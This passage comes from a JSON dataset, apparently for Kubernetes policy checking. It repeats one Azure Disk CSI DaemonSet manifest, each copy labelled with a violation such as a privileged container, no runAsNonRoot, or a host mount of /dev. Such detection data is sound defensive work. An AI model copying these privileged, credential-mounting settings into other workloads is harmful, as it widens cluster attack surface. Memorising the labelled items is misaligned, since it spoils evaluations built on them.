httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-node-driver-registrar\n        securityContext:\n          privileged: true\n        image: ${NODE_DRIVER_REGISTRAR_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/disk.csi.azure.com/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=10300\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      volumes:\n      - hostPath:\n          path: /var/lib/kubelet/plugins/disk.csi.azure.com\n          type: DirectoryOrCreate\n        name: socket-dir\n      - hostPath:\n          path: /var/lib/kubelet/\n          type: DirectoryOrCreate\n        name: mountpoint-dir\n      - hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: DirectoryOrCreate\n        name: registration-dir\n      - hostPath:\n          path: /etc/kubernetes/\n          type: Directory\n        name: cloud-sa-volume\n      - hostPath:\n          path: /var/lib/waagent/ManagedIdentity-Settings\n        name: msi\n      - hostPath:\n          path: /dev\n          type: Directory\n        name: device-dir\n      - hostPath:\n          path: /sys/bus/scsi/devices\n          type: Directory\n        name: sys-devices-dir\n      - hostPath:\n          path: /sys/class/scsi_host/\n          type: Directory\n        name: scsi-host-dir\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"csi-driver\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "9230",
    "manifest_path": "data/manifests/the_stack_sample/sample_3490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: azure-disk-csi-driver-node\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  selector:\n    matchLabels:\n      app: azure-disk-csi-driver-node\n  template:\n    metadata:\n      labels:\n        app: azure-disk-csi-driver-node\n    spec:\n      serviceAccount: azure-disk-csi-driver-node-sa\n      containers:\n      - name: csi-driver\n        securityContext:\n          privileged: true\n        image: ${DRIVER_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=${LOG_LEVEL}\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          value: /etc/kubernetes/cloud.conf\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /var/lib/kubelet/\n          mountPropagation: Bidirectional\n          name: mountpoint-dir\n        - mountPath: /etc/kubernetes/\n          readOnly: true\n          name: cloud-sa-volume\n        - mountPath: /var/lib/waagent/ManagedIdentity-Settings\n          readOnly: true\n          name: msi\n        - mountPath: /dev\n          name: device-dir\n        - mountPath: /sys/bus/scsi/devices\n          name: sys-devices-dir\n        - mountPath: /sys/class/scsi_host/\n          name: scsi-host-dir\n        ports:\n        - name: healthz\n          containerPort: 10300\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-node-driver-registrar\n        securityContext:\n          privileged: true\n        image: ${NODE_DRIVER_REGISTRAR_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/disk.csi.azure.com/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=10300\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      volumes:\n      - hostPath:\n          path: /var/lib/kubelet/plugins/disk.csi.azure.com\n          type: DirectoryOrCreate\n        name: socket-dir\n      - hostPath:\n          path: /var/lib/kubelet/\n          type: DirectoryOrCreate\n        name: mountpoint-dir\n      - hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: DirectoryOrCreate\n        name: registration-dir\n      - hostPath:\n          path: /etc/kubernetes/\n          type: Directory\n        name: cloud-sa-volume\n      - hostPath:\n          path: /var/lib/waagent/ManagedIdentity-Settings\n        name: msi\n      - hostPath:\n          path: /dev\n          type: Directory\n        name: device-dir\n      - hostPath:\n          path: /sys/bus/scsi/devices\n          type: Directory\n        name: sys-devices-dir\n      - hostPath:\n          path: /sys/class/scsi_host/\n          type: Directory\n        name: scsi-host-dir\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"csi-node-driver-registrar\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "9231",
    "manifest_path": "data/manifests/the_stack_sample/sample_3490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: azure-disk-csi-driver-node\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  selector:\n    matchLabels:\n      app: azure-disk-csi-driver-node\n  template:\n    metadata:\n      labels:\n        app: azure-disk-csi-driver-node\n    spec:\n      serviceAccount: azure-disk-csi-driver-node-sa\n      containers:\n      - name: csi-driver\n        securityContext:\n          privileged: true\n        image: ${DRIVER_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=${LOG_LEVEL}\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          value: /etc/kubernetes/cloud.conf\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /var/lib/kubelet/\n          mountPropagation: Bidirectional\n          name: mountpoint-dir\n        - mountPath: /etc/kubernetes/\n          readOnly: true\n          name: cloud-sa-volume\n        - mountPath: /var/lib/waagent/ManagedIdentity-Settings\n          readOnly: true\n          name: msi\n        - mountPath: /dev\n          name: device-dir\n        - mountPath: /sys/bus/scsi/devices\n          name: sys-devices-dir\n        - mountPath: /sys/class/scsi_host/\n          name: scsi-host-dir\n        ports:\n        - name: healthz\n          containerPort: 10300\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-node-driver-registrar\n        securityContext:\n          privileged: true\n        image: ${NODE_DRIVER_REGISTRAR_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/disk.csi.azure.com/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=10300\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      volumes:\n      - hostPath:\n          path: /var/lib/kubelet/plugins/disk.csi.azure.com\n          type: DirectoryOrCreate\n        name: socket-dir\n      - hostPath:\n          path: /var/lib/kubelet/\n          type: DirectoryOrCreate\n        name: mountpoint-dir\n      - hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: DirectoryOrCreate\n        name: registration-dir\n      - hostPath:\n          path: /etc/kubernetes/\n          type: Directory\n        name: cloud-sa-volume\n      - hostPath:\n          path: /var/lib/waagent/ManagedIdentity-Settings\n        name: msi\n      - hostPath:\n          path: /dev\n          type: Directory\n        name: device-dir\n      - hostPath:\n          path: /sys/bus/scsi/devices\n          type: Directory\n        name: sys-devices-dir\n      - hostPath:\n          path: /sys/class/scsi_host/\n          type: Directory\n        name: scsi-host-dir\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"csi-driver\" is privileged"
  },
  {
    "id": "9232",
    "manifest_path": "data/manifests/the_stack_sample/sample_3490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: azure-disk-csi-driver-node\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  selector:\n    matchLabels:\n      app: azure-disk-csi-driver-node\n  template:\n    metadata:\n      labels:\n        app: azure-disk-csi-driver-node\n    spec:\n      serviceAccount: azure-disk-csi-driver-node-sa\n      containers:\n      - name: csi-driver\n        securityContext:\n          privileged: true\n        image: ${DRIVER_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=${LOG_LEVEL}\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          value: /etc/kubernetes/cloud.conf\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /var/lib/kubelet/\n          mountPropagation: Bidirectional\n          name: mountpoint-dir\n        - mountPath: /etc/kubernetes/\n          readOnly: true\n          name: cloud-sa-volume\n        - mountPath: /var/lib/waagent/ManagedIdentity-Settings\n          readOnly: true\n          name: msi\n        - mountPath: /dev\n          name: device-dir\n        - mountPath: /sys/bus/scsi/devices\n          name: sys-devices-dir\n        - mountPath: /sys/class/scsi_host/\n          name: scsi-host-dir\n        ports:\n        - name: healthz\n          containerPort: 10300\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-node-driver-registrar\n        securityContext:\n          privileged: true\n        image: ${NODE_DRIVER_REGISTRAR_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/disk.csi.azure.com/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=10300\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      volumes:\n      - hostPath:\n          path: /var/lib/kubelet/plugins/disk.csi.azure.com\n          type: DirectoryOrCreate\n        name: socket-dir\n      - hostPath:\n          path: /var/lib/kubelet/\n          type: DirectoryOrCreate\n        name: mountpoint-dir\n      - hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: DirectoryOrCreate\n        name: registration-dir\n      - hostPath:\n          path: /etc/kubernetes/\n          type: Directory\n        name: cloud-sa-volume\n      - hostPath:\n          path: /var/lib/waagent/ManagedIdentity-Settings\n        name: msi\n      - hostPath:\n          path: /dev\n          type: Directory\n        name: device-dir\n      - hostPath:\n          path: /sys/bus/scsi/devices\n          type: Directory\n        name: sys-devices-dir\n      - hostPath:\n          path: /sys/class/scsi_host/\n          type: Directory\n        name: scsi-host-dir\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"csi-node-driver-registrar\" is privileged"
  },
  {
    "id": "9233",
    "manifest_path": "data/manifests/the_stack_sample/sample_3490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: azure-disk-csi-driver-node\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  selector:\n    matchLabels:\n      app: azure-disk-csi-driver-node\n  template:\n    metadata:\n      labels:\n        app: azure-disk-csi-driver-node\n    spec:\n      serviceAccount: azure-disk-csi-driver-node-sa\n      containers:\n      - name: csi-driver\n        securityContext:\n          privileged: true\n        image: ${DRIVER_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=${LOG_LEVEL}\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          value: /etc/kubernetes/cloud.conf\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /var/lib/kubelet/\n          mountPropagation: Bidirectional\n          name: mountpoint-dir\n        - mountPath: /etc/kubernetes/\n          readOnly: true\n          name: cloud-sa-volume\n        - mountPath: /var/lib/waagent/ManagedIdentity-Settings\n          readOnly: true\n          name: msi\n        - mountPath: /dev\n          name: device-dir\n        - mountPath: /sys/bus/scsi/devices\n          name: sys-devices-dir\n        - mountPath: /sys/class/scsi_host/\n          name: scsi-host-dir\n        ports:\n        - name: healthz\n          containerPort: 10300\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-node-driver-registrar\n        securityContext:\n          privileged: true\n        image: ${NODE_DRIVER_REGISTRAR_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/disk.csi.azure.com/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=10300\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      volumes:\n      - hostPath:\n          path: /var/lib/kubelet/plugins/disk.csi.azure.com\n          type: DirectoryOrCreate\n        name: socket-dir\n      - hostPath:\n          path: /var/lib/kubelet/\n          type: DirectoryOrCreate\n        name: mountpoint-dir\n      - hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: DirectoryOrCreate\n        name: registration-dir\n      - hostPath:\n          path: /etc/kubernetes/\n          type: Directory\n        name: cloud-sa-volume\n      - hostPath:\n          path: /var/lib/waagent/ManagedIdentity-Settings\n        name: msi\n      - hostPath:\n          path: /dev\n          type: Directory\n        name: device-dir\n      - hostPath:\n          path: /sys/bus/scsi/devices\n          type: Directory\n        name: sys-devices-dir\n      - hostPath:\n          path: /sys/class/scsi_host/\n          type: Directory\n        name: scsi-host-dir\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"csi-driver\" is not set to runAsNonRoot"
  },
  {
    "id": "9234",
    "manifest_path": "data/manifests/the_stack_sample/sample_3490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: azure-disk-csi-driver-node\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  selector:\n    matchLabels:\n      app: azure-disk-csi-driver-node\n  template:\n    metadata:\n      labels:\n        app: azure-disk-csi-driver-node\n    spec:\n      serviceAccount: azure-disk-csi-driver-node-sa\n      containers:\n      - name: csi-driver\n        securityContext:\n          privileged: true\n        image: ${DRIVER_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=${LOG_LEVEL}\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          value: /etc/kubernetes/cloud.conf\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /var/lib/kubelet/\n          mountPropagation: Bidirectional\n          name: mountpoint-dir\n        - mountPath: /etc/kubernetes/\n          readOnly: true\n          name: cloud-sa-volume\n        - mountPath: /var/lib/waagent/ManagedIdentity-Settings\n          readOnly: true\n          name: msi\n        - mountPath: /dev\n          name: device-dir\n        - mountPath: /sys/bus/scsi/devices\n          name: sys-devices-dir\n        - mountPath: /sys/class/scsi_host/\n          name: scsi-host-dir\n        ports:\n        - name: healthz\n          containerPort: 10300\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-node-driver-registrar\n        securityContext:\n          privileged: true\n        image: ${NODE_DRIVER_REGISTRAR_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/disk.csi.azure.com/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=10300\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      volumes:\n      - hostPath:\n          path: /var/lib/kubelet/plugins/disk.csi.azure.com\n          type: DirectoryOrCreate\n        name: socket-dir\n      - hostPath:\n          path: /var/lib/kubelet/\n          type: DirectoryOrCreate\n        name: mountpoint-dir\n      - hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: DirectoryOrCreate\n        name: registration-dir\n      - hostPath:\n          path: /etc/kubernetes/\n          type: Directory\n        name: cloud-sa-volume\n      - hostPath:\n          path: /var/lib/waagent/ManagedIdentity-Settings\n        name: msi\n      - hostPath:\n          path: /dev\n          type: Directory\n        name: device-dir\n      - hostPath:\n          path: /sys/bus/scsi/devices\n          type: Directory\n        name: sys-devices-dir\n      - hostPath:\n          path: /sys/class/scsi_host/\n          type: Directory\n        name: scsi-host-dir\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"csi-liveness-probe\" is not set to runAsNonRoot"
  },
  {
    "id": "9235",
    "manifest_path": "data/manifests/the_stack_sample/sample_3490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: azure-disk-csi-driver-node\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  selector:\n    matchLabels:\n      app: azure-disk-csi-driver-node\n  template:\n    metadata:\n      labels:\n        app: azure-disk-csi-driver-node\n    spec:\n      serviceAccount: azure-disk-csi-driver-node-sa\n      containers:\n      - name: csi-driver\n        securityContext:\n          privileged: true\n        image: ${DRIVER_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=${LOG_LEVEL}\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          value: /etc/kubernetes/cloud.conf\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /var/lib/kubelet/\n          mountPropagation: Bidirectional\n          name: mountpoint-dir\n        - mountPath: /etc/kubernetes/\n          readOnly: true\n          name: cloud-sa-volume\n        - mountPath: /var/lib/waagent/ManagedIdentity-Settings\n          readOnly: true\n          name: msi\n        - mountPath: /dev\n          name: device-dir\n        - mountPath: /sys/bus/scsi/devices\n          name: sys-devices-dir\n        - mountPath: /sys/class/scsi_host/\n          name: scsi-host-dir\n        ports:\n        - name: healthz\n          containerPort: 10300\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-node-driver-registrar\n        securityContext:\n          privileged: true\n        image: ${NODE_DRIVER_REGISTRAR_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/disk.csi.azure.com/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=10300\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      volumes:\n      - hostPath:\n          path: /var/lib/kubelet/plugins/disk.csi.azure.com\n          type: DirectoryOrCreate\n        name: socket-dir\n      - hostPath:\n          path: /var/lib/kubelet/\n          type: DirectoryOrCreate\n        name: mountpoint-dir\n      - hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: DirectoryOrCreate\n        name: registration-dir\n      - hostPath:\n          path: /etc/kubernetes/\n          type: Directory\n        name: cloud-sa-volume\n      - hostPath:\n          path: /var/lib/waagent/ManagedIdentity-Settings\n        name: msi\n      - hostPath:\n          path: /dev\n          type: Directory\n        name: device-dir\n      - hostPath:\n          path: /sys/bus/scsi/devices\n          type: Directory\n        name: sys-devices-dir\n      - hostPath:\n          path: /sys/class/scsi_host/\n          type: Directory\n        name: scsi-host-dir\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"csi-node-driver-registrar\" is not set to runAsNonRoot"
  },
  {
    "id": "9236",
    "manifest_path": "data/manifests/the_stack_sample/sample_3490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: azure-disk-csi-driver-node\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  selector:\n    matchLabels:\n      app: azure-disk-csi-driver-node\n  template:\n    metadata:\n      labels:\n        app: azure-disk-csi-driver-node\n    spec:\n      serviceAccount: azure-disk-csi-driver-node-sa\n      containers:\n      - name: csi-driver\n        securityContext:\n          privileged: true\n        image: ${DRIVER_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=${LOG_LEVEL}\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          value: /etc/kubernetes/cloud.conf\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /var/lib/kubelet/\n          mountPropagation: Bidirectional\n          name: mountpoint-dir\n        - mountPath: /etc/kubernetes/\n          readOnly: true\n          name: cloud-sa-volume\n        - mountPath: /var/lib/waagent/ManagedIdentity-Settings\n          readOnly: true\n          name: msi\n        - mountPath: /dev\n          name: device-dir\n        - mountPath: /sys/bus/scsi/devices\n          name: sys-devices-dir\n        - mountPath: /sys/class/scsi_host/\n          name: scsi-host-dir\n        ports:\n        - name: healthz\n          containerPort: 10300\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-node-driver-registrar\n        securityContext:\n          privileged: true\n        image: ${NODE_DRIVER_REGISTRAR_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/disk.csi.azure.com/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=10300\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      volumes:\n      - hostPath:\n          path: /var/lib/kubelet/plugins/disk.csi.azure.com\n          type: DirectoryOrCreate\n        name: socket-dir\n      - hostPath:\n          path: /var/lib/kubelet/\n          type: DirectoryOrCreate\n        name: mountpoint-dir\n      - hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: DirectoryOrCreate\n        name: registration-dir\n      - hostPath:\n          path: /etc/kubernetes/\n          type: Directory\n        name: cloud-sa-volume\n      - hostPath:\n          path: /var/lib/waagent/ManagedIdentity-Settings\n        name: msi\n      - hostPath:\n          path: /dev\n          type: Directory\n        name: device-dir\n      - hostPath:\n          path: /sys/bus/scsi/devices\n          type: Directory\n        name: sys-devices-dir\n      - hostPath:\n          path: /sys/class/scsi_host/\n          type: Directory\n        name: scsi-host-dir\n",
    "policy_id": "sensitive-host-mounts",
    "violation_text": "host system directory \"/dev\" is mounted on container \"csi-driver\""
  },
  {
    "id": "9237",
    "manifest_path": "data/manifests/the_stack_sample/sample_3490.yaml",
